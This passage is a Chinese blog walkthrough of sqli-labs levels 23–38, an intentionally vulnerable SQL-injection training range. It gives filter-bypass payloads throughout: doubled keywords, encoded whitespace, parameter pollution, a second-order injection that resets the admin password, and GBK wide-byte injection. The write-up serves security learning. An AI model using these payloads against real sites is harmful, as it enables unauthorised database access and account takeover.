<p><img src="https://img-blog.csdnimg.cn/20201005211013625.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>我们可以使用单引号进行闭合，（单引号内的不会被执行）<br><code>&quot;SELECT * FROM users WHERE id=&#39;1&#39;   and &#39;1&#39;=&#39;1 &#39; LIMIT 0,1&quot;</code></p>
<p>tips：这里我必须是url编码才可以进行<br><code>/sqli-labs/Less-23/?id=2%27%20and%20%20%271%27=%27</code><br><img src="https://img-blog.csdnimg.cn/20201005213621627.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>可以正常运行，<br>可是这时候我们不能使用order by 进行检测了，我们可以使用union select 一个一个来，到4发现不行了，<br><img src="https://img-blog.csdnimg.cn/20201005214813852.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><code>SELECT * FROM users WHERE id=&#39;-1&#39; union select 1,2,3 and &#39;1&#39;=&#39;1&#39; LIMIT 0,1</code></p>
<h3 id="Less-24-Second-Degree-Injections-Real-treat-Store-Injections-二次注入"><a href="#Less-24-Second-Degree-Injections-Real-treat-Store-Injections-二次注入" class="headerlink" title="Less - 24 Second Degree Injections  Real treat -Store Injections (二次注入)"></a>Less - 24 Second Degree Injections  <em>Real treat</em> -Store Injections (二次注入)</h3><p><img src="https://img-blog.csdnimg.cn/20201006185513970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>他本身是一个完整的界面，<br><img src="https://img-blog.csdnimg.cn/20201006185752234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>登陆界面，<br><img src="https://img-blog.csdnimg.cn/20201006185829533.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>转义了特殊字符，<br><img src="https://img-blog.csdnimg.cn/20201006190044470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>创建新用户，这里也进行了转义<br>但是，修改密码的地方并没有过滤，那么我们可以进行二次注入</p>
<p><img src="https://img-blog.csdnimg.cn/20201006190200109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>那么我们注册一个<code>admin &#39;#</code> 虽然他是转义了，但是仍然在数据库中仍然存好了，<br><code>$sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin &#39;#&#39; and password=&#39;$curr_pass&#39; &quot;;</code><br>这里查询了username=admin，同时注释了后面的语句<br>那么我们直接修改密码即可，也就相当于修改了admin的密码<br><img src="https://img-blog.csdnimg.cn/20201006191114969.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201006191808577.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h3 id="Less-25-Trick-with-OR-amp-AND-过滤了or和and"><a href="#Less-25-Trick-with-OR-amp-AND-过滤了or和and" class="headerlink" title="Less-25 Trick with OR &amp; AND (过滤了or和and)"></a>Less-25 Trick with OR &amp; AND (过滤了or和and)</h3><p><img src="https://img-blog.csdnimg.cn/20201006192103557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>我么发现他的语句被过滤了，<img src="https://img-blog.csdnimg.cn/20201006192126921.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>因为过滤了or，我们双写即可<br><img src="https://img-blog.csdnimg.cn/20201006192238968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201006192305128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>将我们的and也进行双写绕过，<br>这里进行了匹配or和and，置换为空<br><img src="https://img-blog.csdnimg.cn/20201006192736808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h3 id="Less-25a-Trick-with-OR-amp-AND-Blind-（过滤了or和and的盲注）"><a href="#Less-25a-Trick-with-OR-amp-AND-Blind-（过滤了or和and的盲注）" class="headerlink" title="Less-25a Trick with OR &amp; AND Blind （过滤了or和and的盲注）"></a>Less-25a Trick with OR &amp; AND Blind （过滤了or和and的盲注）</h3><p><img src="https://img-blog.csdnimg.cn/20201006194856459.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>我们发现，数字型的过滤了or和and，我们双写即可，其他同之前的步骤</p>
<p><img src="https://img-blog.csdnimg.cn/20201006195009618.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>不需要单引号进行包裹</p>
<h3 id="Less-26-Trick-with-comments-and-space-过滤了注释和空格的注入"><a href="#Less-26-Trick-with-comments-and-space-过滤了注释和空格的注入" class="headerlink" title="Less-26 Trick with comments and space (过滤了注释和空格的注入)"></a>Less-26 Trick with comments and space (过滤了注释和空格的注入)</h3><p><img src="https://img-blog.csdnimg.cn/20201006201148626.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>发现双引号不报错，单引号报错，说明应该使用单引号闭合<br><img src="https://img-blog.csdnimg.cn/20201006201348184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201006202055280.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>我们发现，他将空格和 and 都过滤了，<br>and 我们可以进行双写，空格该怎么办？<br>我们熟知的有：<br>/**/   （）   + `  \t<br>可是都不行，<br>他的过滤很多<br><img src="https://img-blog.csdnimg.cn/20201006202404887.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20201006202329179.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>我们可以使用url编码绕过</p>
<p>%09 Tab键（水平）<br>%0a 新建一行<br>%0c 新的一页<br>%0d return 键<br>%0b Tab键（垂直）<br>%a0 空格<br>() 绕过</p>
<p>那么我们使用报错注入<br><img src="https://img-blog.csdnimg.cn/20201006203148683.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201006203509219.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>当然，单引号闭合也可以。</p>
<h3 id="less-26a-GET-Blind-Based-All-your-SPACES-and-COMMENTS-belong-to-us-过滤了空格和注释的盲注"><a href="#less-26a-GET-Blind-Based-All-your-SPACES-and-COMMENTS-belong-to-us-过滤了空格和注释的盲注" class="headerlink" title="less 26a GET - Blind Based - All your SPACES and COMMENTS belong to us(过滤了空格和注释的盲注)"></a>less 26a GET - Blind Based - All your SPACES and COMMENTS belong to us(过滤了空格和注释的盲注)</h3><p><img src="https://img-blog.csdnimg.cn/20201006203638231.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>关闭了详细的报错，但是盲注仍然可以找出来，使用’)即可</p>
<p><img src="https://img-blog.csdnimg.cn/20201006203718316.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>其余的同上一关</p>
<h3 id="less-27-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-（过滤了union和select的）"><a href="#less-27-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-（过滤了union和select的）" class="headerlink" title="less 27 GET - Error Based- All your UNION &amp; SELECT belong to us （过滤了union和select的）"></a>less 27 GET - Error Based- All your UNION &amp; SELECT belong to us （过滤了union和select的）</h3><p><img src="https://img-blog.csdnimg.cn/20201008084640196.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这一关多过滤了union和select ,我们可以使用大小写绕过<br><img src="https://img-blog.csdnimg.cn/20201008085240234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201008085844183.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201008091338429.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>测试后发现%0A可以当作括号<br>成功回显</p>
<h3 id="less-27a-GET-Blind-Based-All-your-UNION-amp-SELECT-belong-to-us"><a href="#less-27a-GET-Blind-Based-All-your-UNION-amp-SELECT-belong-to-us" class="headerlink" title="less 27a GET - Blind Based- All your UNION &amp; SELECT belong to us"></a>less 27a GET - Blind Based- All your UNION &amp; SELECT belong to us</h3><p><img src="https://img-blog.csdnimg.cn/20201008091502100.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这里他把报错关了，语句由上一关的单引号，变成了无单引号，经过测试，可以通过双引号进行闭合。<br><img src="https://img-blog.csdnimg.cn/20201008092226751.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h3 id="less-28-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesis基于错误的，有括号的单引号字符型，过滤了union和select等的注入"><a href="#less-28-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesis基于错误的，有括号的单引号字符型，过滤了union和select等的注入" class="headerlink" title="less 28 GET - Error Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis基于错误的，有括号的单引号字符型，过滤了union和select等的注入"></a>less 28 GET - Error Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis基于错误的，有括号的单引号字符型，过滤了union和select等的注入</h3><p><img src="https://img-blog.csdnimg.cn/20201008203643201.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这里是主要是匹配了<code>union select</code>  还有select，其余和上面的相同</p>
<p><img src="https://img-blog.csdnimg.cn/20201008204057296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>双写绕过即可</p>
<h3 id="less-28a-GET-Bind-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesis基于盲注的，有括号的单引号字符型，过滤了union和select等的注入"><a href="#less-28a-GET-Bind-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesis基于盲注的，有括号的单引号字符型，过滤了union和select等的注入" class="headerlink" title="less 28a GET - Bind Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis基于盲注的，有括号的单引号字符型，过滤了union和select等的注入"></a>less 28a GET - Bind Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis基于盲注的，有括号的单引号字符型，过滤了union和select等的注入</h3><p>这个还比上面的简单一点，他只过滤了union select其余的过滤都放开了<br><img src="https://img-blog.csdnimg.cn/20201008204144289.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201008204200775.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（很气，29-31被blog吃了，只能重写一遍）</p>
<h3 id="Less-29-基于WAF的一个错误"><a href="#Less-29-基于WAF的一个错误" class="headerlink" title="Less-29 基于WAF的一个错误"></a>Less-29 基于WAF的一个错误</h3><p>HTTP参数污染（HTTP Parameter Pollution） 攻击者通过在HTTP请求中插入特定的参数来发起攻击,如果Web应用中存在这样的漏洞，可以被攻击者利用来进行客户端或者服务器端的攻击</p>
<p><img src="https://img-blog.csdnimg.cn/20201008205317195.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20201008204210607.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>转自<a target="_blank" rel="noopener" href="https://al0neranger.github.io/2020/02/16/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-Sqli-labs%E9%9D%B6%E5%9C%BA-7/#030-less-30">聂哥</a><br>http参数污染，见sql注入总结的HTTP参数污染即可,</p>
<p>上面已经说过，waf服务器（tomcat）只解析重复参数里面的前者，而真正的web服务器（Apache）只解析重复参数里面的后者，我们可以传入两个id参数，前者合法而后者为我们想注入的内容</p>
<p>我们的后端是apache，那么我们只要将参数放在后面即可<br><img src="https://img-blog.csdnimg.cn/20201008210558192.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h3 id="Less-30-Get-Blind-Havaing-with-WAF"><a href="#Less-30-Get-Blind-Havaing-with-WAF" class="headerlink" title="Less-30 Get-Blind Havaing with WAF"></a>Less-30 Get-Blind Havaing with WAF</h3><p>同如上的方法，只不过这里换成了双引号而已<br><img src="https://img-blog.csdnimg.cn/2020100820334890.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201008211627150.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h3 id="Less-31-Protection-with-WAF"><a href="#Less-31-Protection-with-WAF" class="headerlink" title="Less-31 Protection with WAF"></a>Less-31 Protection with WAF</h3><p><img src="https://img-blog.csdnimg.cn/20201008211712699.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>与上面一致，只不过换成了“）来闭合<br><code>$sql=&quot;SELECT * FROM users WHERE id= (&quot;$id&quot;) LIMIT 0,1&quot;;</code><br><img src="https://img-blog.csdnimg.cn/20201008211947528.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h3 id="Less-32-Bypass-addslashes"><a href="#Less-32-Bypass-addslashes" class="headerlink" title="Less-32 Bypass addslashes()"></a>Less-32 Bypass addslashes()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function check_addslashes($string)</span><br><span class="line">&#123;</span><br><span class="line">    $string &#x3D; preg_replace(&#39;&#x2F;&#39;. preg_quote(&#39;\\&#39;) .&#39;&#x2F;&#39;, &quot;\\\\\\&quot;, $string);          &#x2F;&#x2F;escape any backslash</span><br><span class="line">    $string &#x3D; preg_replace(&#39;&#x2F;\&#39;&#x2F;i&#39;, &#39;\\\&#39;&#39;, $string);                               &#x2F;&#x2F;escape single quote with a backslash</span><br><span class="line">    $string &#x3D; preg_replace(&#39;&#x2F;\&quot;&#x2F;&#39;, &quot;\\\&quot;&quot;, $string);                                &#x2F;&#x2F;escape double quote with a backslash</span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">    return $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>函数preg_quote<br><img src="https://img-blog.csdnimg.cn/20201011101622265.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这里的使用方法是这个<br><img src="https://img-blog.csdnimg.cn/20201011101806776.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>将单引号，双引号转换为了\\，\i表示不区分大小写<br><img src="https://img-blog.csdnimg.cn/20201011102237270.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>将字符集设置成了gbk<br>才可以进行宽字节注入<br><img src="https://img-blog.csdnimg.cn/20201011102405319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>我们发现他都是被转义的<br>因为数据库是gbk编码，那么，我们可以进行宽字节注入了<br>我们尝试<code>%df&#39;</code>，然后将浏览器编码改为gbk，我们可以看到，他变成了汉字</p>
<p>这是因为加上反斜杠也就是<code>%5c</code>之后传入参数整体为<code>%df%5c%27</code>，而前面说过，在mysql里认为前两个字符是一个汉字，也就是‘運’，而后面的单引号就逃逸出来了</p>
<ul>
<li>宽字节注入的本质是PHP与MySQL使用的字符集不同，只要低位的范围中含有0x5c的编码，就可以进行宽字节注入。</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20201011102943899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201011103102919.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>查询时，mysql会在布尔型判断时会将数字开头的字符串当成其开头的数字，但是注意字符串要被引号包裹<br><img src="https://img-blog.csdnimg.cn/2020101110370639.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/202010111039305.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>我们的语句变为了<br><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;-1�&#39; union select 1,2,3--+&#39; LIMIT 0,1&quot;;</code></p>
<h3 id="Less-33-Bypass-addslashes"><a href="#Less-33-Bypass-addslashes" class="headerlink" title="Less-33 Bypass addslashes()"></a>Less-33 Bypass addslashes()</h3><p><img src="https://img-blog.csdnimg.cn/20201011105109968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>和上一关一致，只不过换成了addslashe函数</p>
<ul>
<li>addslashes() 函数<br>函数返回在预定义字符之前添加反斜杠的字符串。<br>单引号（’）<br>双引号（”）<br>反斜杠（\）<br>NULL</li>
</ul>
<h3 id="Less-34-Bypass-Add-SLASHES"><a href="#Less-34-Bypass-Add-SLASHES" class="headerlink" title="Less-34 Bypass Add SLASHES"></a>Less-34 Bypass Add SLASHES</h3><p><img src="https://img-blog.csdnimg.cn/20201011105432828.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这一关需要抓包，抓包后的工作同less-32关</p>
<h3 id="Less-35-why-care-for-addslashes"><a href="#Less-35-why-care-for-addslashes" class="headerlink" title="Less-35 why care for addslashes()"></a>Less-35 why care for addslashes()</h3><p><img src="https://img-blog.csdnimg.cn/20201011105724675.png#pic_center" alt="在这里插入图片描述"><br>因为语句是数字型，那么，他的过滤都是无用的，我们直接进行数字型的注入即可<br><img src="https://img-blog.csdnimg.cn/20201011110010102.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h3 id="Less-36-Bypass-MySQL-Real-Escape-String"><a href="#Less-36-Bypass-MySQL-Real-Escape-String" class="headerlink" title="Less-36 Bypass MySQL Real Escape String"></a>Less-36 Bypass MySQL Real Escape String</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function check_quotes($string)</span><br><span class="line">&#123;</span><br><span class="line">    $string&#x3D; mysql_real_escape_string($string);    </span><br><span class="line">    return $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>本关使用了<code>mysql_real_escape_string</code>函数<br><img src="https://img-blog.csdnimg.cn/20201011110614564.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>同时，设置了gbk编码，那么就会存在宽字节注入<br><img src="https://img-blog.csdnimg.cn/2020101111071090.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h3 id="Less-37-MySQL-real-escape-string"><a href="#Less-37-MySQL-real-escape-string" class="headerlink" title="Less-37- MySQL_real_escape_string"></a>Less-37- MySQL_real_escape_string</h3><p>这一关变为了post传参，其余和正常的宽字节注入一致，<br>同less-34<br><img src="https://img-blog.csdnimg.cn/20201011110901525.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h2 id="page-3"><a href="#page-3" class="headerlink" title="page-3"></a>page-3</h2><h3 id="Less-38-stacked-Query"><a href="#Less-38-stacked-Query" class="headerlink" title="Less-38 stacked Query"></a>Less-38 stacked Query</h3><p>这一关是堆叠注入，详细的堆叠注入见sql注入总结<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/hxhxhxhxx/article/details/108921489">总结</a></p>
